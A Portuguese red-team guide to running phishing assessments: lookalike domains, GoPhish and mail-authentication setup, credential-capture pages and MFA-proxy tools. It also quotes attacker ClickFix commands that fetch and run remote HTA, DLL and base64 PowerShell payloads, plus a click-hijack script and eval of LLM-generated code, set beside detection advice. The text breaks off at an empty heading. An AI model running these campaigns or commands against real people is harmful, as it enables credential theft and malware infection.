# Metodologia de Phishing

## Metodologia

1. Faça o Recon da vítima
1. Selecione o **domínio da vítima**.
2. Realize alguma enumeração básica na web **procurando portais de login** usados pela vítima e **decida** qual você vai **personificar**.
3. Use algum **OSINT** para **encontrar e-mails**.
2. Prepare o ambiente
1. **Compre o domínio** que você vai usar para a avaliação de phishing
2. **Configure os registros relacionados ao serviço de e-mail** (SPF, DMARC, DKIM, rDNS)
3. Configure o VPS com **gophish**
3. Prepare a campanha
1. Prepare o **modelo de e-mail**
2. Prepare a **página web** para roubar as credenciais
4. Lance a campanha!

## Gerar nomes de domínio semelhantes ou comprar um domínio confiável

### Técnicas de variação de nomes de domínio

- **Keyword**: O nome de domínio **contém** uma **keyword importante** do domínio original (por exemplo, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **subdomínio com hífen**: Altere o **ponto para um hífen** de um subdomínio (por exemplo, www-zelster.com).
- **Novo TLD**: Mesmo domínio usando um **novo TLD** (por exemplo, zelster.org)
- **Homoglyph**: Ele **substitui** uma letra no nome de domínio por **letras visualmente semelhantes** (por exemplo, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Ele **troca duas letras** dentro do nome de domínio (por exemplo, zelsetr.com).
- **Singularization/Pluralization**: Adiciona ou remove “s” no final do nome de domínio (por exemplo, zeltsers.com).
- **Omission**: Ele **remove uma** das letras do nome de domínio (por exemplo, zelser.com).
- **Repetition:** Ele **repete uma** das letras no nome de domínio (por exemplo, zeltsser.com).
- **Replacement**: Semelhante a homoglyph, mas menos furtivo. Substitui uma das letras no nome de domínio, talvez por uma letra próxima da letra original no teclado (por exemplo, zektser.com).
- **Subdomained**: Introduza um **ponto** dentro do nome de domínio (por exemplo, ze.lster.com).
- **Insertion**: Ele **insere uma letra** no nome de domínio (por exemplo, zerltser.com).
- **Missing dot**: Anexe o TLD ao nome de domínio. (por exemplo, zelstercom.com)

**Ferramentas automáticas**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Existe a **possibilidade de que alguns bits armazenados ou em comunicação possam ser invertidos automaticamente** devido a vários fatores, como erupções solares, raios cósmicos ou erros de hardware.

Quando esse conceito é **aplicado a solicitações DNS**, é possível que o **domínio recebido pelo servidor DNS** não seja o mesmo domínio solicitado inicialmente.

Por exemplo, uma única modificação de bit no domínio "windows.com" pode alterá-lo para "windnws.com."

Os atacantes podem **tirar proveito disso registrando vários domínios de bit-flipping** semelhantes ao domínio da vítima. A intenção é redirecionar usuários legítimos para sua própria infraestrutura.

Para obter mais informações, leia [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Comprar um domínio confiável

Você pode pesquisar em [https://www.expireddomains.net/](https://www.expireddomains.net) por um domínio expirado que possa usar.\
Para garantir que o domínio expirado que você vai comprar **já tenha um bom SEO**, você pode pesquisar como ele é categorizado em:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Descobrindo e-mails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Para **descobrir mais** endereços de e-mail válidos ou **verificar aqueles que** você já descobriu, você pode verificar se consegue aplicar brute force aos servidores SMTP da vítima. [Saiba aqui como verificar/descobrir endereços de e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Além disso, não se esqueça de que, se os usuários usarem **algum portal web para acessar seus e-mails**, você pode verificar se ele é vulnerável a **username brute force** e explorar a vulnerabilidade, se possível.

## Configurando o GoPhish

### Instalação

Você pode baixá-lo em [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Baixe e descompacte-o dentro de `/opt/gophish` e execute `/opt/gophish/gophish`\
Será fornecida uma senha para o usuário administrador na porta 3333 na saída. Portanto, acesse essa porta e use essas credenciais para alterar a senha do administrador. Talvez seja necessário criar um túnel dessa porta para o sistema local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuração

**Configuração do certificado TLS**

Antes desta etapa, você já deve ter **comprado o domínio** que vai usar, e ele deve estar **apontando** para o **IP do VPS** onde você está configurando o **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuração de e-mail**

Comece instalando: `apt-get install postfix`

Em seguida, adicione o domínio aos seguintes arquivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Altere também os valores das seguintes variáveis dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Por fim, modifique os arquivos **`/etc/hostname`** e **`/etc/mailname`** para usar o nome do seu domínio e **reinicie seu VPS.**

Agora, crie um **registro DNS A** de `mail.<domain>` apontando para o **endereço IP** do VPS e um **registro DNS MX** apontando para `mail.<domain>`

Agora vamos testar o envio de um e-mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuração do Gophish**

Pare a execução do gophish e vamos configurá-lo.\
Modifique `/opt/gophish/config.json` para o seguinte (observe o uso de https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurar o serviço gophish**

Para criar o serviço gophish para que ele possa ser iniciado automaticamente e gerenciado como um serviço, você pode criar o arquivo `/etc/init.d/gophish` com o seguinte conteúdo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Conclua a configuração do serviço e verifique-o fazendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurando o mail server e o domínio

### Aguarde e seja legítimo

Quanto mais antigo for um domínio, menor será a probabilidade de ele ser detectado como spam. Portanto, você deve aguardar o máximo de tempo possível (pelo menos 1 semana) antes do phishing assessment. Além disso, se você colocar uma página sobre um setor de boa reputação, a reputação obtida será melhor.

Observe que, mesmo que você precise aguardar uma semana, pode concluir toda a configuração agora.

### Configure o registro Reverse DNS (rDNS)

Defina um registro rDNS (PTR) que resolva o endereço IP do VPS para o nome de domínio.

### Registro Sender Policy Framework (SPF)

Você deve **configurar um registro SPF para o novo domínio**. Se você não sabe o que é um registro SPF, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Você pode usar [https://www.spfwizard.net/](https://www.spfwizard.net) para gerar sua política SPF (use o IP da máquina VPS)

![Formulário do SPF Wizard para gerar um registro SPF para um domínio de phishing](<../../images/image (1037).png>)

Este é o conteúdo que deve ser definido dentro de um registro TXT no domínio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Registro de Domain-based Message Authentication, Reporting & Conformance (DMARC)

Você deve **configurar um registro DMARC para o novo domínio**. Se você não sabe o que é um registro DMARC, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Você precisa criar um novo registro DNS TXT apontando o hostname `_dmarc.<domain>` com o seguinte conteúdo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Você deve **configurar um DKIM para o novo domínio**. Se não sabe o que é um registro DMARC, [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Este tutorial é baseado em: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Você precisa concatenar os dois valores B64 gerados pela chave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste a pontuação da configuração do seu email

Você pode fazer isso usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Basta acessar a página e enviar um email para o endereço fornecido:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Você também pode **verificar sua configuração de email** enviando um email para `check-auth@verifier.port25.com` e **lendo a resposta** (para isso, será necessário **abrir** a porta **25** e verificar a resposta no arquivo _/var/mail/root_ se você enviar o email como root).\
Verifique se você passa em todos os testes:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Você também pode enviar uma **mensagem para um Gmail sob seu controle** e verificar os **cabeçalhos do e-mail** na sua caixa de entrada do Gmail; `dkim=pass` deve estar presente no campo de cabeçalho `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removendo da Blacklist da Spamhaus

A página [www.mail-tester.com](https://www.mail-tester.com) pode indicar se o seu domínio está sendo bloqueado pela Spamhaus. Você pode solicitar a remoção do seu domínio/IP em: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removendo da Blacklist da Microsoft

​​Você pode solicitar a remoção do seu domínio/IP em [https://sender.office.com/](https://sender.office.com).

## Criar e iniciar uma campanha do GoPhish

### Sending Profile

- Defina um **nome para identificar** o perfil do remetente
- Decida de qual conta você enviará os emails de phishing. Sugestões: _noreply, support, servicedesk, salesforce..._
- Você pode deixar o nome de usuário e a senha em branco, mas certifique-se de marcar a opção Ignore Certificate Errors

![Criar e iniciar uma campanha do GoPhish - Sending Profile: Você pode deixar o nome de usuário e a senha em branco, mas certifique-se de marcar a opção Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> É recomendado usar a funcionalidade "**Send Test Email**" para testar se tudo está funcionando.\
> Recomendo **enviar os emails de teste para endereços de email temporários de 10 minutos** para evitar entrar em uma blacklist durante os testes.

### Email Template

- Defina um **nome para identificar** o template
- Em seguida, escreva um **assunto** (nada estranho, apenas algo que você esperaria ler em um email comum)
- Certifique-se de que a opção "**Add Tracking Image**" esteja marcada
- Escreva o **template do email** (você pode usar variáveis como no exemplo a seguir):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Observe que **para aumentar a credibilidade do email**, recomenda-se usar alguma assinatura de um email do cliente. Sugestões:

- Envie um email para um **endereço inexistente** e verifique se a resposta contém alguma assinatura.
- Procure **emails públicos** como info@ex.com, press@ex.com ou public@ex.com, envie um email e aguarde a resposta.
- Tente entrar em contato com algum email **válido descoberto** e aguarde a resposta.

![Sending Profile - Email Template: Tente entrar em contato com algum email válido descoberto e aguarde a resposta](<../../images/image (80).png>)

> [!TIP]
> O Email Template também permite **anexar arquivos para envio**. Se você também quiser roubar desafios NTLM usando alguns arquivos/documentos especialmente criados [leia esta página](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Escreva um **nome**
- **Escreva o código HTML** da página web. Observe que você pode **importar** páginas web.
- Marque **Capture Submitted Data** e **Capture Passwords**
- Defina um **redirecionamento**

![Email Template - Landing Page: Marque Capture Submitted Data e Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalmente, será necessário modificar o código HTML da página e fazer alguns testes localmente (talvez usando algum servidor Apache) **até gostar dos resultados.** Em seguida, escreva esse código HTML na caixa.\
> Observe que, se precisar **usar alguns recursos estáticos** para o HTML (talvez algumas páginas CSS e JS), você poderá salvá-los em _**/opt/gophish/static/endpoint**_ e acessá-los a partir de _**/static/\<filename>**_

> [!TIP]
> Para o redirecionamento, você poderia **redirecionar os usuários para a página web principal legítima** da vítima ou, por exemplo, redirecioná-los para _/static/migration.html_, inserir uma **roda de carregamento (**[**https://loading.io/**](https://loading.io)**) por 5 segundos e depois indicar que o processo foi concluído com sucesso**.

### Users & Groups

- Defina um nome
- **Importe os dados** (observe que, para usar o template do exemplo, você precisará do nome, sobrenome e endereço de email de cada usuário)

![Landing Page - Users & Groups: Importe os dados (observe que, para usar o template do exemplo, você precisará do nome, sobrenome e endereço de email de cada usuário)](<../../images/image (163).png>)

### Campaign

Por fim, crie uma campaign selecionando um nome, o email template, a landing page, a URL, o sending profile e o grupo. Observe que a URL será o link enviado às vítimas.

Observe que o **Sending Profile permite enviar um email de teste para verificar como será a aparência do email de phishing final**:

![Users & Groups - Campaign: Observe que o Sending Profile permite enviar um email de teste para verificar como será a aparência do email de phishing final](<../../images/image (192).png>)

Quando tudo estiver pronto, basta iniciar a campaign!

## Website Cloning

Se, por algum motivo, você quiser clonar o website, consulte a página a seguir:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Em algumas avaliações de phishing (principalmente para Red Teams), você também poderá querer **enviar arquivos contendo algum tipo de backdoor** (talvez um C2 ou simplesmente algo que acione uma autenticação).\
Confira a página a seguir para ver alguns exemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

O ataque anterior é bastante inteligente, pois você está falsificando um website real e coletando as informações inseridas pelo usuário. Infelizmente, se o usuário não inserir a senha correta ou se o aplicativo falsificado estiver configurado com 2FA, **essas informações não permitirão que você se passe pelo usuário enganado**.

É aqui que ferramentas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) são úteis. Essa ferramenta permitirá gerar um ataque semelhante a MitM. Basicamente, os ataques funcionam da seguinte maneira:

1. Você **se passa pelo formulário de login** da página web real.
2. O usuário **envia** suas **credenciais** para a sua página falsa, e a ferramenta as envia para a página web real, **verificando se as credenciais funcionam**.
3. Se a conta estiver configurada com **2FA**, a página MitM solicitará o código e, assim que o **usuário o inserir**, a ferramenta o enviará para a página web real.
4. Quando o usuário estiver autenticado, você, como atacante, terá **capturado as credenciais, o 2FA, o cookie e todas as informações** de cada interação realizada enquanto a ferramenta executa um MitM.

### Via VNC

E se, em vez de **enviar a vítima para uma página maliciosa** com a mesma aparência da original, você a enviasse para uma **sessão VNC com um navegador conectado à página web real**? Você poderá ver o que ela faz, roubar a senha, o MFA usado, os cookies...\
Você pode fazer isso com [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Obviamente, uma das melhores maneiras de saber se você foi descoberto é **pesquisar seu domínio em blacklists**. Se ele aparecer listado, de alguma forma seu domínio foi detectado como suspeito.\
Uma maneira fácil de verificar se seu domínio aparece em alguma blacklist é usar [https://malwareworld.com/](https://malwareworld.com)

No entanto, existem outras maneiras de saber se a vítima está **procurando ativamente por atividades suspeitas de phishing na internet**, conforme explicado em:


{{#ref}}
detecting-phising.md
{{#endref}}

Você pode **comprar um domínio com um nome muito semelhante** ao domínio da vítima **e/ou gerar um certificado** para um **subdomínio** de um domínio controlado por você, **contendo** a **palavra-chave** do domínio da vítima. Se a **vítima** realizar qualquer tipo de **interação DNS ou HTTP** com eles, você saberá que **ela está procurando ativamente** por domínios suspeitos e precisará ser muito furtivo.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)para avaliar se seu email terminará na pasta de spam ou se será bloqueado ou terá sucesso.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Os grupos de intrusão modernos cada vez mais ignoram completamente os atrativos por email e **visam diretamente o fluxo de trabalho do service desk / recuperação de identidade** para contornar o MFA. O ataque é totalmente baseado em "living-off-the-land": assim que o operador obtém credenciais válidas, ele faz pivot usando ferramentas administrativas integradas – nenhum malware é necessário.<sup>[[6]](#references)</sup>

### Attack flow
1. Faça o reconhecimento da vítima
* Colete detalhes pessoais e corporativos do LinkedIn, data breaches, GitHub público etc.
* Identifique identidades de alto valor (executivos, TI, finanças) e enumere o **processo exato do help desk** para redefinição de senha / MFA.
2. Engenharia social em tempo real
* Ligue, envie mensagem pelo Teams ou converse com o help desk enquanto se passa pelo alvo (geralmente usando **caller-ID falsificado** ou **voz clonada**).
* Forneça as PII coletadas anteriormente para passar pela verificação baseada em conhecimento.
* Convença o agente a **redefinir o segredo do MFA** ou realizar um **SIM-swap** em um número de celular registrado.
3. Ações imediatas após o acesso (≤60 min em casos reais)
* Estabeleça um foothold por meio de qualquer portal web de SSO.
* Enumere AD / AzureAD usando ferramentas integradas (nenhum binário é gravado):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Faça movimentação lateral com **WMI**, **PsExec** ou agentes **RMM** legítimos já permitidos no ambiente.

### Detection & Mitigation
* Trate a recuperação de identidade pelo help desk como uma **operação privilegiada** – exija step-up auth e aprovação do gerente.
* Implante regras de **Identity Threat Detection & Response (ITDR)** / **UEBA** que gerem alertas para:
* Método de MFA alterado + autenticação de um novo dispositivo / localização geográfica.
* Elevação imediata do mesmo principal (user-→-admin).
* Grave as chamadas do help desk e exija um **retorno de chamada para um número já registrado** antes de qualquer redefinição.
* Implemente **Just-In-Time (JIT) / Privileged Access** para que contas recém-redefinidas **não herdem automaticamente tokens de alto privilégio**.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Grupos de baixo custo compensam o custo de operações de alto contato com ataques em massa que transformam **mecanismos de pesquisa e redes de anúncios no canal de entrega**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** promove um resultado falso, como `chromium-update[.]site`, no topo dos anúncios de pesquisa.
2. A vítima baixa um pequeno **first-stage loader** (frequentemente JS/HTA/ISO). Exemplos observados pela Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. O loader exfiltra cookies do navegador + bancos de dados de credenciais e, em seguida, busca um **silent loader**, que decide – *em tempo real* – se deve implantar:
* RAT (por exemplo, AsyncRAT, RustDesk)
* ransomware / wiper
* componente de persistência (chave Run do registry + scheduled task)

### Hardening tips
* Bloqueie domínios recém-registrados e aplique **Advanced DNS / URL Filtering** também aos *search-ads*, além do email.
* Restrinja a instalação de software a pacotes MSI / Store assinados; impeça a execução de `HTA`, `ISO` e `VBS` por política.
* Monitore processos filhos de navegadores que abrem instaladores:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Procure por LOLBins frequentemente abusados por first-stage loaders (por exemplo, `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Alguns portais de software falso mantêm o `href` de download visível apontando para a URL real do GitHub/release, mas sequestram a **primeira** interação do usuário em JavaScript e enviam a vítima para uma cadeia de **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Principais características:
- O hook geralmente é executado na **capture phase** (`true`) em `document`, portanto é acionado antes dos handlers do site.
- O Chrome frequentemente usa `mousedown` em vez de `click` para manter o redirect vinculado a um **user gesture** válido e melhorar o bypass de bloqueadores de pop-up.
- Algumas variantes abrem previamente `about:blank` ou sintetizam cliques em `<a target="_blank">` e só depois atribuem a URL do TDS.
- Os limites no lado do navegador geralmente ficam em `localStorage`, portanto o **primeiro clique** pode levar ao malware, enquanto refreshes/tentativas subsequentes retornam ao link visível com aparência benigna.
- O TDS pode aplicar filtros por referrer, domínio de entrada, GEO, fingerprint do navegador/dispositivo, verificações de VPN/datacenter, contexto do clique e contadores por sessão, tornando os replays do analista não determinísticos.

Ideias para o defensor:
- Compare o `href` **exibido** com o destino de navegação **real** gerado no momento do clique.
- Procure handlers `document.addEventListener(..., true)` que chamem tanto `preventDefault()` quanto `stopImmediatePropagation()` junto de `window.open`, `about:blank` ou cliques sintéticos em âncoras.
- Trate clusters de domínios de download de software recém-registrados que carregam o mesmo estágio CloudFront/JS como um padrão de alto sinal de SEO poisoning/TDS.

### ClickFix em páginas falsas de verificação + fetches de LOLBAS com aparência de arquivo compactado
Alguns branches de TDS terminam em uma página falsa de verificação (no estilo Cloudflare/IUAM) que instrui a vítima a executar um binário confiável do Windows, como:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notas:
- `mshta.exe` executa o **HTA/VBScript no início da resposta**, mesmo que a URL finja apontar para um arquivo `.7z`; os dados de arquivo anexados podem ser um simples chamariz.
- Os estágios seguintes frequentemente continuam mentindo sobre o tipo de arquivo (`.rtf` para PowerShell, `.asar` para Python, ZIPs com binários preenchidos) e então mudam para **manual PE mapping / in-memory execution**.
- Se você estiver respondendo a uma dessas cadeias, preserve a **rede + memória desde a primeira execução bem-sucedida**: replays posteriores podem mostrar apenas um caminho benigno de instalador/SFX ou falhar porque a liberação do payload/chave estava vinculada à sessão TDS original.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Isca: advisory nacional do CERT clonado com um botão **Update** que exibe instruções passo a passo para “corrigir” o problema. As vítimas são instruídas a executar um batch que baixa uma DLL e a executa via `rundll32`.<sup>[[12]](#references)</sup>
* Cadeia típica de batch observada:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` grava o payload em `%TEMP%`, uma pausa curta oculta a variação da rede e, em seguida, `rundll32` chama o entrypoint exportado (`notepad`).
* A DLL envia beacons com a identidade do host e consulta o C2 a cada poucos minutos. O tasking remoto chega como **PowerShell codificado em base64**, executado ocultamente e com bypass de políticas:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Isso preserva a flexibilidade do C2 (o servidor pode trocar as tasks sem atualizar a DLL) e oculta as janelas do console. Procure por processos filhos do `rundll32.exe` executando PowerShell com `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` em conjunto.
* Defensores podem procurar callbacks HTTP(S) no formato `...page.php?tynor=<COMPUTER>sss<USER>` e intervalos de polling de 5 minutos após o carregamento da DLL.

---

## Operações de Phishing Aprimoradas por IA
Os atacantes agora encadeiam **APIs de LLM e voice-clone** para iscas totalmente personalizadas e interação em tempo real.

| Camada | Exemplo de uso pelo threat actor |
|-------|-------------|
|Automation|Gerar e enviar >100 mil e-mails / SMS com redação randomizada e links de tracking.|
|Generative AI|Produzir e-mails *one-off* mencionando M&A público, piadas internas de redes sociais; voz deep-fake do CEO em um golpe de callback.|
|Agentic AI|Registrar domínios de forma autônoma, coletar open-source intel e elaborar os e-mails do próximo estágio quando uma vítima clica, mas não envia as credenciais.|

**Defesa:**
• Adicione **banners dinâmicos** destacando mensagens enviadas por automação não confiável (por meio de anomalias de ARC/DKIM).
• Implante **frases de desafio de biometria de voz** para solicitações telefônicas de alto risco.
• Simule continuamente iscas geradas por IA em programas de conscientização – templates estáticos estão obsoletos.

Veja também – abuso de agentic browsing para credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Veja também – abuso de AI agent de ferramentas CLI locais e MCP (para inventário e detecção de secrets):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Montagem de JavaScript em runtime assistida por LLM (codegen de código no navegador)

Os atacantes podem distribuir HTML com aparência benigna e **gerar o stealer em runtime** solicitando JavaScript a uma **API de LLM confiável** e, em seguida, executá-lo no navegador (por exemplo, `eval` ou `<script>` dinâmico).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** codificar URLs de exfiltração/strings Base64 no prompt; iterar a redação para contornar filtros de segurança e reduzir alucinações.
2. **Client-side API call:** no carregamento, o JS chama uma LLM pública (Gemini/DeepSeek/etc.) ou um proxy CDN; apenas o prompt/a chamada à API estão presentes no HTML estático.
3. **Assemble & exec:** concatenar a resposta e executá-la (polimórfica a cada visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** o código gerado personaliza o lure (por exemplo, parsing de tokens do LogoKit) e envia as creds para o endpoint oculto no prompt.

**Características de evasão**
- O tráfego atinge domínios conhecidos de LLM ou proxies de CDN confiáveis; às vezes, usa WebSockets para um backend.
- Nenhum payload estático; o JS malicioso só existe após a renderização.
- Gerações não determinísticas produzem stealers **únicos** por sessão.

**Ideias de detecção**
- Execute sandboxes com JS habilitado; sinalize **`eval` em runtime/criação dinâmica de scripts originada de respostas de LLM**.
- Procure por POSTs do front-end para APIs de LLM imediatamente seguidos por `eval`/`Function` no texto retornado.
- Gere alertas para domínios de LLM não autorizados no tráfego do cliente, seguidos por POSTs de credenciais.

---

## Variante de MFA Fatigue / Push Bombing – Forced Reset
Além do push-bombing clássico, os operadores simplesmente **forçam um novo registro de MFA** durante a chamada ao help desk, invalidando o token existente do usuário.  Qualquer prompt de login subsequente parece legítimo para a vítima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitore eventos do AzureAD/AWS/Okta nos quais **`deleteMFA` + `addMFA`** ocorram **em poucos minutos a partir do mesmo IP**.



## Clipboard Hijacking / Pastejacking

